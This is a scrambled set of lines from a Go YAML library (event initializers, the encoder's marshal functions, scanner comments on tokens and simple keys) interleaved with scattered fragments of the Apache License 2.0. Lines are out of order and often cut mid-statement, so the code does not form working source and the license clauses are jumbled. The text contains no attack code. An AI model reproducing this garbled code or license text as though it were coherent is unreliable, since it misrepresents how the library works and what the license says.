//    while (pointer < end) {
"//                document.nodes.start[mapping-1].data.mapping.pairs, pair))"
// Create DOCUMENT-START.
// Create MAPPING-END.
return err
//yaml_document_get_node(document 
pos] = 
func yaml_emitter_set_indent(emitter 
if indent < 2 
parser = yaml_parser_t{}
//YAML_DECLARE(int)
emitter.write_handler = yaml_writer_write_handler
//yaml_document_add_scalar(document 
 Append a pair of a key and a value to a mapping node.
"events:     make([]yaml_event_t, 0, initial_queue_size),"
func yaml_parser_delete(parser 
 value >= 0x800) 
//yaml_token_delete(yaml_token_t 
//        version_directive_copy.major = version_directive.major
//        for (tag_directive = tag_directives_start
//        error yaml_error_type_t
 tag_directives_end) 
//    assert(document.nodes.start[mapping-1].type == YAML_MAPPING_NODE)
"yaml_parser_t, encoding yaml_encoding_t) {"
// Create a new parser object.
if emitter.encoding != yaml_ANY_ENCODING {
copy(parser.tokens[parser.tokens_head
"yaml_emitter_t, encoding yaml_encoding_t) {"
//            yaml_free(token.data.tag.handle)
  // Non-NULL token object expected.
 indent > 9 {
"//    } nodes = { NULL, NULL, NULL }"
"yaml_emitter_t, canonical bool) {"
"typ:      yaml_STREAM_START_EVENT,"
emitter.unicode = unicode
"return 0, io.EOF"
"//    if (!yaml_check_utf8(anchor, strlen((char "
//            default:
//        version_directive_copy = yaml_malloc(sizeof(yaml_version_directive_t))
 Destroy a document object.
"version_directive: version_directive,"
//            case YAML_SEQUENCE_NODE:
//    return NULL
"panic(""must set the output target only once"")"
//        }
"document, nodes.start, nodes.end, version_directive_copy,"
"anchor:   anchor,"
"yaml_document_t,"
"yaml_event_t,"
"yaml_parser_t, buffer []byte) (n int, err error) {"
"yaml_emitter_t, width int) {"
end = start
//    assert(value) // Non-NULL value is expected.
//                            // Valid key id is required.
//            tag_directive
//    node yaml_node_t
//        if (pointer
//                            // Valid mapping id is required.
"tag:      tag,"
"context, nodes, INITIAL_STACK_SIZE)) goto error"
 0x07 : 0
// Create MAPPING-START.
yaml_token_t) {
"typ:             yaml_SCALAR_EVENT,"
)tag_directive.prefix)))
func yaml_writer_write_handler(emitter 
"yaml_char_t, style yaml_mapping_style_t)"
//            break
//        top 
//    switch (token.type)
"tag:             tag,"
//    assert(mapping > 0
parser = yaml_parser_t{
"panic(""must set the encoding only once"")"
//            if (!value.handle 
func yaml_sequence_end_event_initialize(event 
if parser.read_handler != nil {
)YAML_DEFAULT_SEQUENCE_TAG
//    assert(value > 0 
"tag_directives:    tag_directives,"
"yaml_event_t, anchor "
 document.nodes.start 
emitter = yaml_emitter_t{
//        value = (octet 
"//    if (!yaml_check_utf8(value, length)) goto error"
"//fmt.Println(""yaml_insert_token"", ""pos:"", pos, ""typ:"", token.typ, ""head:"", parser.tokens_head, ""len:"", len(parser.tokens))"
"//            start_implicit, end_implicit, mark, mark)"
 0x3F)
// Set the preferred line width.
if parser.tokens_head != len(parser.tokens) {
//                            // Valid sequence id is required.
//yaml_document_get_root_node(document 
// String write handler.
"context, pairs)"
 0x1F :
"implicit:        plain_implicit,"
// Destroy an emitter object.
indent = 2
//            yaml_free(token.data.tag_directive.prefix)
//        case YAML_SCALAR_TOKEN:
parser.tokens = parser.tokens[:len(parser.tokens)-parser.tokens_head]
//        if (!((width == 1) 
parser.input = input
func yaml_document_end_event_initialize(event 
 0xC0) != 0x80) return 0
pos:])
if emitter.write_handler != nil {
//            assert(tag_directive.handle)
"yaml_tag_directive_t,"
//    value_copy[length] = '
//            value.handle = NULL
"//    } items = { NULL, NULL, NULL }"
//    yaml_char_t 
return nil
//            tag_directive != document.tag_directives.end
 Add a mapping node to a document.
 Get the root object.
//    DOCUMENT_INIT(
"//    } tag_directives_copy = { NULL, NULL, NULL }"
// Set the output encoding.
"yaml_emitter_t, indent int) {"
func yaml_emitter_delete(emitter 
"states:     make([]yaml_emitter_state_t, 0, initial_stack_size),"
yaml_parser_t) {
"yaml_char_t, style yaml_sequence_style_t)"
//        yaml_free(value.prefix)
//    version_directive_copy 
yaml_tag_directive_t
)YAML_DEFAULT_SCALAR_TAG
//error:
// Set a file input.
if parser.tokens_head > 0 
//        node yaml_node_t = POP(
//        switch (node.type) {
"//    } pairs = { NULL, NULL, NULL }"
//                            // A sequence node is required.
 octet 
"//    MAPPING_NODE_INIT(node, tag_copy, pairs.start, pairs.end,"
//            value = (value << 6) 
 key <= document.nodes.top)
"style:    yaml_style_t(style),"
//    return 1
 tag_directive 
// Create SEQUENCE-END.
"context, tag_directives_copy, value))"
yaml_parser_t) bool {
if parser.input_pos == len(parser.input) {
"buffer:     make([]byte, output_buffer_size),"
"//    SCALAR_NODE_INIT(node, tag_copy, value_copy, length, style, mark, mark)"
import (
emitter.output_buffer = append(
"yaml_parser_t, input []byte) {"
emitter.output_buffer = output_buffer
emitter.line_break = line_break
//        unsigned int width
// Create STREAM-START.
"yaml_parser_t, r io.Reader) {"
//    tag_copy = yaml_strdup(tag)
func yaml_stream_end_event_initialize(event 
"yaml_char_t, length int,"
//    if (version_directive) {
//yaml_document_add_sequence(document 
parser.tokens[parser.tokens_head
//        width = (octet 
//    if (index > 0 
//            value.prefix = yaml_strdup(tag_directive.prefix)
 0x7F :
"quoted_implicit: quoted_implicit,"
//            value.prefix = NULL
"yaml_emitter_t, unicode bool) {"
 item <= document.nodes.top)
event = yaml_event_t{
//            yaml_free(token.data.anchor.value)
 (octet 
// Create DOCUMENT-END.
//    yaml_free(version_directive_copy)
"panic(""must set the output encoding only once"")"
"yaml_event_t, implicit bool) {"
"return n, nil"
emitter.best_indent = indent
//        tag_directives_start 
)tag_directive.handle)))
func yaml_emitter_set_canonical(emitter 
"event, anchor_copy, mark, mark)"
//            (width == 4 
yaml_node_item_t
"yaml_event_t, encoding yaml_encoding_t) {"
//        return document.nodes.start
//    yaml_free(value.prefix)
return parser.input_reader.Read(buffer)
//    anchor_copy = yaml_strdup(anchor)
//    if (!tag_copy) goto error
//    return 0
 Check 'reader.c' for more details on UTF-8 encoding.
"anchor:          anchor,"
func yaml_insert_token(parser 
//    STACK_DEL(
"raw_buffer: make([]byte, 0, output_raw_buffer_size),"
)tag))) goto error
//        tag_directives_end 
return
func yaml_emitter_initialize(emitter 
// emitted text.
 len(parser.tokens) == cap(parser.tokens) {
//            goto error
"yaml_char_t, value "
 value <= document.nodes.top)
"context,"
//                break
"encoder) marshalDoc(tag string, in reflect.Value) {"
encoder) init() {
e.must(yaml_sequence_end_event_initialize(
yaml_emitter_initialize(
"e.event, nil, nil, true)"
out     []byte
if err == nil {
"s = ""false"""
package yaml
""" suffix."
[0-9][0-9_]
"n""):"
if in.Type() == timeType {
encoder) destroy() {
"e.slicev(tag, in)"
"e.event, true)"
yaml_document_end_event_initialize(
panic(err)
value = in.Field(info.Num)
if !(c == '
s := t.Format(time.RFC3339Nano)
style = yaml_FLOW_SEQUENCE_STYLE
default:
"v, err := m.MarshalYAML()"
style := yaml_BLOCK_MAPPING_STYLE
"for _, item := range slice {"
"e.floatv(tag, in)"
// fallback case - no number could be obtained
"encoder) mapv(tag string, in reflect.Value) {"
style = yaml_LITERAL_SCALAR_STYLE
keys := keyList(in.MapKeys())
String() string
// purposes because YAML has special support for
if !ok {
style = yaml_DOUBLE_QUOTED_SCALAR_STYLE
"failf(""cannot marshal invalid UTF-8 data as %s"", shortTag(tag))"
yaml_stream_end_event_initialize(
e.event))
"e.marshal(tag, in)"
"case reflect.Slice, reflect.Array:"
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
"e.marshal("""", k)"
"sinfo, err := getStructInfo(in.Type())"
"e.marshal("""", value)"
// the time being for compatibility with other parsers.
" strings.IndexByte(s, ':') < 0 {"
"failf(""explicitly tagged !!binary data must be base64-encoded"")"
in = reflect.ValueOf(float)
// and encode it as base64.
e.flow = false
var base60float = regexp.MustCompile(
// there's no need to quote it.
 !isBase60Float(s)
// if they explicitly specify a tag and a string containing
encoder) nilv() {
c := s[0]
 c <= '9') 
"Int64() (int64, error)"
 in.Type().String())
// doneInit holds whether the initial stream_start_event has been
"""strconv"""
canUsePlain := true
e.out)
fail(err)
keys := keyList(m.MapKeys())
e.flow = info.Flow
case reflect.Interface:
"e.event, nil, []byte(tag), implicit, style))"
yaml_emitter_set_output_string(
"""strings"""
"e.emitter, "
yaml_emitter_set_unicode(
case jsonNumber:
"encoder) timev(tag string, in reflect.Value) {"
"text, err := m.MarshalText()"
"case time.Time, "
"e.event, []byte(anchor), []byte(tag), []byte(value), implicit, implicit, style))"
"e.intv(tag, in)"
"if s == """" {"
precision = 32
"e.timev(tag, in)"
"s := strconv.FormatUint(in.Uint(), 10)"
"encoder) stringv(tag string, in reflect.Value) {"
"encoder) marshal(tag string, in reflect.Value) {"
case reflect.Ptr:
"encoder) floatv(tag string, in reflect.Value) {"
// timestamps.
"panic(fmt.Sprintf(""Can't have key %q in inlined map"
"e.emitScalar(""null"", """", """", yaml_PLAIN_SCALAR_STYLE)"
"""regexp"""
style = yaml_PLAIN_SCALAR_STYLE
"e.marshal("""", in.Index(i))"
"encoder) emitScalar(value, anchor, tag string, style yaml_scalar_style_t) {"
"e.marshal("""", reflect.ValueOf(info.Key))"
"for _, info := range sinfo.FieldsList {"
"e.marshal("""", reflect.ValueOf(item.Value))"
n := in.Len()
t := in.Interface().(time.Time)
encoder) emit() {
"e.emitter, true)"
continue
if in.Type() == durationType {
tag = yaml_BINARY_TAG
sort.Sort(keys)
canUsePlain = rtag == yaml_STR_TAG 
yaml_emitter_delete(
"if _, found := sinfo.FieldsMap[k.String()]"
if m.Len() > 0 {
"// is bogus. In practice parsers do not enforce the """
if in.Bool() {
"e.marshal(tag, in.Elem())"
"s := strconv.FormatFloat(in.Float(), 'g', -1, precision)"
encoder) finish() {
yaml_document_start_event_initialize(
"if msg == """" {"
} else {
msg := e.emitter.problem
"// order, when encoding this type."
"e.uintv(tag, in)"
"// From http://yaml.org/type/float.html, except the regular expression there"
"case """
switch in.Kind() {
"float, err := m.Float64()"
break
"e.stringv(tag, reflect.ValueOf(iface.(time.Duration).String()))"
"// in YAML 1.2 and by this package, but these should be marshalled quoted for"
"Inf"":"
"e.boolv(tag, in)"
if err != nil {
e.event)
style := yaml_BLOCK_SEQUENCE_STYLE
func newEncoder() 
yaml_mapping_end_event_initialize(
// Do the full match.
case !utf8.ValidString(s):
"// encoder should prefer the use of Int64(), Float64() and string(), in that"
if in.Type().Elem() == mapItemType {
doneInit bool
"encoder) slicev(tag string, in reflect.Value) {"
if v == nil {
"e.emitScalar(s, """", tag, yaml_PLAIN_SCALAR_STYLE)"
case reflect.Map:
"""fmt"""
// This will internally delete the e.event value.
yaml_emitter_set_output_writer(
"for _, k := range keys {"
if info.Inline == nil {
in = reflect.ValueOf(string(text))
if e.doneInit {
"e.marshal("""", m.MapIndex(k))"
import (
"case ""NaN"":"
"e.marshal("""", in.MapIndex(k))"
if e.flow {
// Fast path.
// emitted.
"e.mappingv(tag, func() {"
 c >= '0' 
"panic(""cannot marshal type: "" "
type jsonNumber interface {
func isBase60Float(s string) (result bool) {
"""reflect"""
::[0-5]
"// tag when encoded unquoted. If it doesn't,"
"""encoding"""
if info.OmitEmpty 
[0-9])
type encoder struct {
switch s {
// Issue 
"case ""-Inf"":"
 found {
"s = "".inf"""
flow    bool
in = reflect.ValueOf(v)
"// Although time.Time implements TextMarshaler,"
case nil:
 isZero(value) {
// isBase60 returns whether s is in base 60 notation as defined in YAML 1.1.
"s = "".nan"""
for i := 0
yaml_stream_start_event_initialize(
e.emit()
"// supports other libraries like jsoniter, which use a similar datatype with"
e.init()
"e.stringv(tag, in)"
event   yaml_event_t
// Check to see if it would resolve to a specific
"encoder) boolv(tag string, in reflect.Value) {"
"encoder) uintv(tag string, in reflect.Value) {"
// we don't want to treat it as a string for YAML
// the same interface. Detecting this interface is useful when dealing with
"Float64() (float64, error)"
// jsonNumber is the interface of the encoding/json.Number datatype.
time.Time:
"msg = ""unknown problem generating YAML content"""
e.must(yaml_emitter_emit(
"encoder) mappingv(tag string, f func()) {"
e.doneInit = true
// In this case the json.Number is a valid float64
// Note: it's possible for user code to emit invalid YAML
// text that's incompatible with that tag.
switch m := iface.(type) {
// It can't be encoded directly as YAML so use a binary tag
"""time"""
if tag == yaml_BINARY_TAG {
if in.Type() == ptrTimeType {
"e.event, yaml_UTF8_ENCODING)"
case canUsePlain:
"integer, err := m.Int64()"
 in.Kind() == reflect.Ptr 
e.nilv()
encoder{}
func newEncoderWithWriter(w io.Writer) 
switch {
emitter yaml_emitter_t
" conflicts with struct field"", k.String()))"
"failf(""%s"", msg)"
"e.mapv(tag, in)"
"e.emitter, w)"
case reflect.Bool:
m := in.Field(sinfo.InlineMap)
return base60float.MatchString(s)
"""unicode/utf8"""
encoder) must(ok bool) {
case reflect.String:
"// structures containing json.Number, which is a string under the hood. The"
"encoder) itemsv(tag string, in reflect.Value) {"
e := 
"e.emitScalar(s, """", tag, style)"
"352: When formatting, use the precision of the underlying value"
 in.IsNil() {
.[0-9_]
"encoder) intv(tag string, in reflect.Value) {"
case encoding.TextMarshaler:
style = yaml_FLOW_MAPPING_STYLE
"rtag, _ := resolve("""", s)"
 c == '-' 
"s = ""-.inf"""
encoder {
"e.timev(tag, in.Elem())"
value = in.FieldByIndex(info.Inline)
"// Repeating the interface here avoids a dependency on encoding/json, and also"
return false
return e
e.emitter)
func (e 
// In this case the json.Number is a valid int64
case Marshaler:
"e.event, nil, []byte(tag), implicit, style)"
case reflect.Struct:
precision := 64
if !in.IsValid() 
yaml_mapping_start_event_initialize(
"""io"""
var s string
"encoder) structv(tag string, in reflect.Value) {"
if in.Kind() == reflect.Float32 {
"e.itemsv(tag, in)"
e.must(yaml_scalar_event_initialize(
"s := strconv.FormatInt(in.Int(), 10)"
var value reflect.Value
e.must(yaml_sequence_start_event_initialize(
"s = ""true"""
if sinfo.InlineMap >= 0 {
s = encodeBase64(s)
slice := in.Convert(reflect.TypeOf([]MapItem{})).Interface().([]MapItem)
"case reflect.Float32, reflect.Float64:"
"case strings.Contains(s, """
in = reflect.ValueOf(integer)
return
"e.marshal("""", reflect.ValueOf(item.Key))"
// The base 60 float notation in YAML 1.1 is a terrible idea and is unsupported
"if tag != """" {"
"""sort"""
 i < n
"implicit := tag == """""
iface := in.Interface()
"e.structv(tag, in)"
in = reflect.ValueOf(m.String())
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
"case tag == """":"
var style yaml_scalar_style_t
e.emitter.open_ended = false
s := in.String()
"      To apply the Apache License to your work, attach the following"
      meet the following conditions:
 within the Source form or
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      incidental, or consequential damages of any character arising as a"
"          that You distribute, all copyright, patent, trademark, and"
          the Derivative Works
"      communication on electronic mailing lists, source code control systems,"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      for any such Derivative Works as a whole, provided Your use,"
"      reproduction, and distribution of the Work otherwise complies with"
   2. Grant of Copyright License. Subject to the terms and conditions of
"          or as an addendum to the NOTICE text from the Work, provided"
   4. Redistribution. You may reproduce and distribute copies of the
      may provide additional or different license terms and conditions
      or by an individual or Legal Entity authorized to submit on behalf of
      as of the date such litigation is filed.
"      or contributory patent infringement, then any patent licenses"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
      Contribution(s) alone or by combination of their Contribution(s)
      or other liability obligations and/or rights consistent with this
"      designated in writing by the copyright owner as ""Not a Contribution."""
      subsequently incorporated within the Work.
      with Licensor regarding such Contributions.
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      excluding communication that is conspicuously marked or otherwise
"          documentation, if provided along with the Derivative Works"
"      names, trademarks, service marks, or product names of the Licensor,"
      (a) You must give any other recipients of the Work or
"      same ""printed page"" as the copyright notice for easier"
      comment syntax for the file format. We also recommend that a
"      means any form of electronic, verbal, or written communication sent"
"                           Version 2.0, January 2004"
"      copyright license to reproduce, prepare Derivative Works of,"
      origin of the Work and reproducing the content of the NOTICE file.
"   8. Limitation of Liability. In no event and under no legal theory,"
"      (c) You must retain, in the Source form of any Derivative Works"
          do not modify the License. You may add Your own attribution
"      other entities that control, are controlled by, or are under common"
"          notices within Derivative Works that You distribute, alongside"
                                 Apache License
"      transformation or translation of a Source form, including but"
          that such additional attribution notices cannot be construed
"      incurred by, or claims asserted against, such Contributor by reason"
      the brackets!)  The text should be enclosed in the appropriate
"      Licensor for the purpose of discussing and improving the Work, but"
"      (except as stated in this section) patent license to make, have made,"
   9. Accepting Warranty or Additional Liability. While redistributing
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
          include a readable copy of the attribution notices contained
   APPENDIX: How to apply the Apache License to your work.
"   Licensed under the Apache License, Version 2.0 (the ""License"")"
      file or class name and description of purpose be included on the
"      of any other Contributor, and only if You agree to indemnify,"
      and distribution as defined by Sections 1 through 9 of this document.
 and
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
      Work and such Derivative Works in Source or Object form.
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      of this License, Derivative Works shall not include works that remain"
"      direction or management of such entity, whether by contract or"
"      whether in tort (including negligence), contract, or otherwise,"
      appropriateness of using or redistributing the Work and assume any
"      ""Contribution"" shall mean any work of authorship, including"
      and conversions to other media types.
"      agreed to in writing, Licensor provides the Work (and each"
"      publicly display, publicly perform, sublicense, and distribute the"
      institute patent litigation against any entity (including a
          excluding those notices that do not pertain to any part of
      by You to the Licensor shall be under the terms and conditions of
"      represent, as a whole, an original work of authorship. For the purposes"
      or a Contribution incorporated within the Work constitutes direct
"      source, and configuration files."
   you may not use this file except in compliance with the License.
"      to the Licensor or its representatives, including but not limited to"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"      ""Work"" shall mean the work of authorship, whether in Source or"
      where such license applies only to those patent claims licensable
"      ""Legal Entity"" shall mean the union of the acting entity and all"
   END OF TERMS AND CONDITIONS
      (b) You must cause any modified files to carry prominent notices
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      Work or Derivative Works thereof in any medium, with or without"
          of the NOTICE file are for informational purposes only and
"      for use, reproduction, or distribution of Your modifications, or"
          Derivative Works a copy of this License
"          within a display generated by the Derivative Works, if and"
          as modifying the License.
          wherever such third-party notices normally appear. The contents
      (an example is provided in the Appendix below).
      unless required by applicable law (such as deliberate and grossly
   1. Definitions.
"      to that Work or Derivative Works thereof, that is intentionally"
       http://www.apache.org/licenses/LICENSE-2.0
      submitted to Licensor for inclusion in the Work by the copyright owner
"      including but not limited to software source code, documentation"
"      outstanding shares, or (iii) beneficial ownership of such entity."
      with the Work to which such Contribution(s) was submitted. If You
      the terms of any separate license agreement you may have executed
          as part of the Derivative Works
"      liable to You for damages, including any direct, indirect, special,"
      on behalf of whom a Contribution has been received by Licensor and
"      the Work or Derivative Works thereof, You may choose to offer,"
"      implied, including, without limitation, any warranties or conditions"
      of your accepting any such warranty or additional liability.
"      Object form, made available under the License, as indicated by a"
   See the License for the specific language governing permissions and
"          pertain to any part of the Derivative Works, in at least one"
                        http://www.apache.org/licenses/
      the Work and Derivative Works thereof.
   You may obtain a copy of the License at
"      boilerplate notice, with the fields enclosed by brackets ""{}"""
"          distribution, then any Derivative Works that You distribute must"
      except as required for reasonable and customary use in describing the
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
      identification within third-party archives.
      You may add Your own copyright statement to Your modifications and
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
          of the following places: within a NOTICE text file distributed
   Copyright {yyyy} {name of copyright owner}
"      control with that entity. For the purposes of this definition,"
"      Work (including but not limited to damages for loss of goodwill,"
"      ""control"" means (i) the power, direct or indirect, to cause the"
      has been advised of the possibility of such damages.
      copyright notice that is included in or attached to the work
"      this License, each Contributor hereby grants to You a perpetual,"
      by such Contributor that are necessarily infringed by their
"          within such NOTICE file, excluding those notices that do not"
      the conditions stated in this License.
   6. Trademarks. This License does not grant permission to use the trade
"      work stoppage, computer failure or malfunction, or any and all"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"   distributed under the License is distributed on an ""AS IS"" BASIS,"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      other commercial damages or losses), even if such Contributor"
"      modifications, and in Source or Object form, provided that You"
   7. Disclaimer of Warranty. Unless required by applicable law or
"      this License, without any additional terms or conditions."
"   Unless required by applicable law or agreed to in writing, software"
"      editorial revisions, annotations, elaborations, or other modifications"
"      ""Source"" form shall mean the preferred form for making modifications,"
      any Contribution intentionally submitted for inclusion in the Work
      risks associated with Your exercise of permissions under this License.
"      not limited to compiled object code, generated documentation,"
      result of this License or out of the use or inability to use the
"      defend, and hold each Contributor harmless for any liability"
      the copyright owner that is granting the License.
          stating that You changed the files
"          attribution notices from the Source form of the Work,"
"      and issue tracking systems that are managed by, or on behalf of, the"
      granted to You under this License for that Work shall terminate
" or,"
"      License. However, in accepting such obligations, You may act only"
      the original version of the Work and any modifications or additions
      replaced with your own identifying information. (Don't include
   3. Grant of Patent License. Subject to the terms and conditions of
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      negligent acts) or agreed to in writing, shall any Contributor be"
"      ""Object"" form shall mean any form resulting from mechanical"
      PARTICULAR PURPOSE. You are solely responsible for determining the
   limitations under the License.
      exercising permissions granted by this License.
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      form, that is based on (or derived from) the Work and for which the"
"      separable from, or merely link (or bind by name) to the interfaces of,"
"if !is_blank(parser.buffer, parser.buffer_pos) {"
//      DOCUMENT-END                    
((value>>6)
// Eat whitespaces and comments until we reach the next token.
"// If we don't determine the token type so far, it is an error."
// Advance the pointer.
// Is it the key indicator
//      ---
"//      VERSION-DIRECTIVE(1,1)"
// Consume the current line.
if parser.buffer[parser.buffer_pos] == '>' 
// [Go] Convert this into more reasonable logic.
// Erase the token object.
// Reset any potential simple key on the current flow level.
//            key 1: value 1
 !leading_blank 
// indentation level.
// Scan indentation spaces and line breaks for a block scalar.  Determine the
if simple_key.possible 
"//case '-', '"
// It is a right double quote.
 len(handle) > 1 
func yaml_parser_fetch_flow_collection_start(parser 
//                
x08')
case 'N': // NEL (
" is_blankz(buf, pos"
if leading_break[0] == '
"// Now, tokens:"
//          - key 1: value 1
"yaml_parser_set_scanner_error(parser, context, start_mark,"
"parser.simple_keys = append(parser.simple_keys, yaml_simple_key_t{})"
"parser.indents = append(parser.indents, parser.indent)"
s = s[:len(s)
"start_mark: simple_key.mark,"
 parser.buffer[parser.buffer_pos] == '%' 
//      STREAM-START(encoding)          
var indent = parser.indent 
1] == '<' {
"// In the block context (and, for the '-' indicator, in the flow context"
"s = append(s, '"
if parser.buffer[parser.buffer_pos] == '{' {
"if !yaml_parser_scan_tag_handle(parser, false, start_mark, "
start_mark := parser.mark
if !literal 
// Ensure that the tokens queue contains at least one token which can be
"suffix:     suffix,"
token = yaml_token_t{
if parser.buffer[parser.buffer_pos
"//      SCALAR(""key"",plain)"
//          FLOW-ENTRY
// Push the current indentation level to the stack and set the new level
case 'n':
"handle, suffix = suffix, handle"
// Is it the end
parser.error = yaml_SCANNER_ERROR
// Create the FLOW-SEQUENCE-START of FLOW-MAPPING-START token.
// Create the BLOCK-ENTRY token and append it to the queue.
"if !yaml_parser_scan_directive(parser, "
// Consume the content of the quoted scalar.
"//      SCALAR(""item 1"",plain)"
//            a folded
max_indent := 0
// Consume the directive name.
// Copy the '!' character.
"!(is_blankz(parser.buffer, parser.buffer_pos) "
//          DOCUMENT-END
// Is is an escaped single quote.
parser.simple_key_allowed = true
//      KEY
"typ:        yaml_SCALAR_TOKEN,"
// It is an escaped line break.
parser.mark.column
 Note that the KEY token is produced.
if !hasTag {
case 'a':
// Create the KEY token and insert it into the queue.
parser.indents = parser.indents[:len(parser.indents)-1]
"start_mark, ""found a tab character that violates indentation"")"
// (cf. the DEDENT token in Python).  However YAML has some syntax pecularities
//            - item 3.1
//          BLOCK-SEQUENCE-START
package yaml
xA9'):
// Scan a prefix.
if parser.flow_level == 0 
if number > -1 {
1) << 4) 
parser.indent = column
token) {
"if parser.buffer[parser.buffer_pos] == ',' {"
// A simple key is allowed at the beginning of the stream.
"// used to describe aliases, anchors, tag, and scalars:"
"handle, "
// NEL . LF
"if !yaml_parser_scan_anchor(parser, "
 parser.buffer[parser.buffer_pos] == ':' 
//          -
prefix = prefix_value
//          - item 1
"if !yaml_parser_scan_block_scalar(parser, "
// Scan the character value.
// Reset the indentation level.
"for is_blank(parser.buffer, parser.buffer_pos) "
 strlen((char 
func yaml_parser_scan(parser 
// Remove a potential simple key at the current flow level.
// Scan the TAG directive value.
prefix_value) {
// Is it a TAG directive
"case '""':"
if octet
if parser.unread < 3 
"', ':', ',', '"
parser.problem_mark = parser.mark
"yaml_parser_t, s []byte) []byte {"
"s = append(s, parser.buffer[parser.buffer_pos:parser.buffer_pos"
leading_break = leading_break[:0]
token := yaml_token_t{}
"start_mark, ""found unexpected document indicator"")"
pos := parser.buffer_pos
// Is it the document start indicator
//switch parser.buffer[parser.buffer_pos] {
parser.stream_end_produced = true
//          : - item 1
// Check if the tag is in the canonical form.
if w == 1024 {
// Check for a potential simple key for each flow level.
if parser.indent >= 0 {
"// BLOCK-MAPPING-START, and BLOCK-END are emitted by the Scanner:"
// Create the ALIAS or ANCHOR token and append it to the queue.
// line.
//      VALUE
if !yaml_parser_stale_simple_keys(parser) {
"// Produce the SCALAR(...,literal) or SCALAR(...,folded) tokens."
"s = append(s, byte(0xE0"
"start_mark, ""found unexpected end of stream"")"
func yaml_parser_unroll_indent(parser 
"case 't', '"
//      VALUE                           
// Eat the indentation spaces and line breaks.
"//          SCALAR(""complex key"")"
// Unknown directive.
func skip(parser 
"//          SCALAR(""a plain scalar"",plain)"
func yaml_parser_fetch_block_entry(parser 
xA8')
return yaml_parser_fetch_key(parser)
// Fetch the next token.
// The set of characters that may appear in URI is as follows:
case 'v':
//      1. Block sequences:
"required:     required,"
return yaml_parser_fetch_flow_entry(parser)
//      ALIAS(anchor)
 ((parser.flow_level > 0 
3) {
"context := ""while parsing a tag"""
"for is_alpha(parser.buffer, parser.buffer_pos) {"
"for !is_blankz(parser.buffer, parser.buffer_pos) {"
"//          SCALAR(""a complex key"",plain)"
// Check if the name is empty.
// Check for EOF.
// Produce the FLOW-SEQUENCE-START or FLOW-MAPPING-START token.
func trace(args ...interface{}) func() {
// Consume the token.
// Scan a plain scalar.
// Check for indicators that may end a plain scalar.
A [ 
x85')
" int8(as_digit(parser.buffer, parser.buffer_pos))"
// The token BLOCK-END denote indentation decrease that ends a block collection
if chomping == 1 {
// Expect a whitespace.
// The specification requires that a simple key
"""did not find expected alphabetic or numeric character"")"
if !yaml_parser_increase_flow_level(parser) {
value = value
"return yaml_parser_fetch_flow_scalar(parser, false)"
"// too), it may also start with the characters"
"yaml_token_t, literal bool) bool {"
//      - item 2
1] == '-' 
// Check if we need to fold the leading line break.
"start_mark, ""found unknown directive name"")"
handle = handle_value
' or '>'.
"', '-', ',', ':', ']', '[', '}', '{', '"
 parser.flow_level == 0 {
 a sequence
func yaml_parser_fetch_flow_collection_end(parser 
"major, "
//          BLOCK-END
parser.buffer[parser.buffer_pos] == '(' 
func yaml_parser_fetch_document_indicator(parser 
"// While we need more tokens to fetch, do it."
 parser.buffer[parser.buffer_pos] == '}' 
// The process of transforming a YAML stream into a sequence of events is
return func() { fmt.Println(pargs...) }
x2028)
// Create the VALUE token and append it to the queue.
"if !yaml_parser_unroll_indent(parser, -1) {"
case 'U':
// Scan the additional block scalar indicators.
"leading_blank = is_blank(parser.buffer, parser.buffer_pos)"
"//          SCALAR(""item 1"",plain)"
"if !yaml_parser_scan_plain_scalar(parser, "
"typ:        yaml_STREAM_END_TOKEN,"
// Remove any potential simple keys.
 (buf[pos
(parser.buffer[parser.buffer_pos] == '-' 
 A good approximation.
// No tokens after STREAM-END or error.
//      2. Block mappings:
//      '
parser.unread -= 2
" is_break(parser.buffer, parser.buffer_pos)) {"
// Eat the right quote.
"typ:        typ,"
// Note that we change the 'simple_key_allowed' flag.
leading_blanks = false
var value int
//      1. An implicit document:
if parser.unread < 1 
// Eat the rest of the line including any comments.
// Check if we are at the end of the scalar.
case 'r':
required := parser.flow_level == 0 
"typ:        yaml_BLOCK_END_TOKEN,"
// Check if we are at the end of the line.
"yaml_parser_set_scanner_error(parser, ""while scanning a quoted scalar"","
// Eat a comment until a line break.
if !yaml_parser_remove_simple_key(parser) {
func yaml_parser_fetch_tag(parser 
"yaml_token_t, single bool) bool {"
// A simple key cannot follow an anchor or an alias.
2] == '-') 
// Check if a simple key may start at the current position and add it if
// Eat the left quote.
" parser.buffer[parser.buffer_pos] == '""' {"
// Check if it is a URI-escape sequence.
1)) 
// Get the octet.
if buf[pos] == '[' {
x80')
// Is it an anchor
if single {
 simple_key.token_number == parser.tokens_parsed {
anchor'
"if is_digit(parser.buffer, parser.buffer_pos) {"
parser.simple_key_allowed = false
"start_mark, ""found extremely long version number"")"
func yaml_parser_scan_block_scalar(parser 
x80' 
"// Actually there are two issues of Scanning that might be called ""clever"", the"
if !yaml_parser_scan_to_next_token(parser) {
// Reset any potential simple keys on the current flow level.
var token yaml_token_t
// suffix to '!'.
if parser.buffer[parser.buffer_pos] != '>' {
"// It is an error for the '-' indicator to occur in the flow context,"
//          FLOW-SEQUENCE-START
//          VALUE
// Simple keys after ':' are allowed in the block context.
